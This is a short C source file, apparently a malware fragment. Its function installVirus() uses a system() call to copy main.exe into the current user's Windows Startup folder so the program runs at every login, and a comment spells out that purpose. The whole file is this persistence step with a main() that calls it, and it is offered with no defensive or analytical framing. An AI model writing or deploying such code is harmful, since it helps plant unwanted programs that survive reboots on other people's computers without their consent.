#include "handler.h"


void installVirus()
{
    system("xcopy main.exe \"%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"");
    //copies main.exe to startup folder
}

int main()
{
    installVirus();
}